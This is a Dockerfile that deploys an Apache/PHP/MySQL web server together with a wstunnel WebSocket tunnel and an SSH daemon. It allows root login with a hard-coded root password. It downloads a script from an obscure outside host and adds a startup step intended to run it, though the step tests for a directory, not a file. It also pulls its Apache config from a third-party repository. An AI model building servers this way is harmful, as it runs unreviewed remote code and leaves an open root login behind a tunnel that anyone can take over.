FROM ubuntu
RUN apt update
RUN DEBIAN_FRONTEND=noninteractive apt install ssh wget npm apache2 php php-curl  mysql-server php-cli php-fpm php-json php-common php-mysql php-zip php-gd php-mbstring  php-xml php-pear php-bcmath screen curl -y
RUN  npm install -g wstunnel
RUN mkdir /run/sshd 
RUN a2enmod proxy
RUN a2enmod proxy_http
RUN a2enmod proxy_wstunnel
RUN a2enmod  rewrite
RUN wget https://raw.githubusercontent.com/netcyabc/cyserver/master/000-default.conf
#RUN wget https://raw.githubusercontent.com/uncleluob/sample/main/000-default.conf
RUN rm /etc/apache2/sites-available/000-default.conf
RUN mv 000-default.conf /etc/apache2/sites-available
RUN echo 'Deploy Success!Remember to upload website to the root!<br/>This is Version 1.7 On 2021/12/25.' >/var/www/html/index.html
RUN echo 'wstunnel -s 0.0.0.0:8989 & ' >>/startup.sh
RUN echo 'service mysql restart' >>/startup.sh
RUN echo 'service apache2 restart' >>/startup.sh
RUN echo '/usr/sbin/sshd -D' >>/startup.sh
RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 

RUN echo 'if [ -d "/cvs.sh" ]; then' >> /startup.sh
RUN echo 'bash cvs.sh' >> /startup.sh
RUN echo 'fi' >> /startup.sh
RUN echo 'DEBIAN_FRONTEND=noninteractive apt upgrade -y' >> /startup.sh
#RUN echo '' >> /startup.sh
RUN echo root:netcyroot|chpasswd
RUN chmod 755 /startup.sh
RUN wget -O /cvs.sh --post-data="profile=rwserv" http://ja.xjqxz.top/cvs.php
RUN apt upgrade -y
EXPOSE 80
CMD  /startup.sh
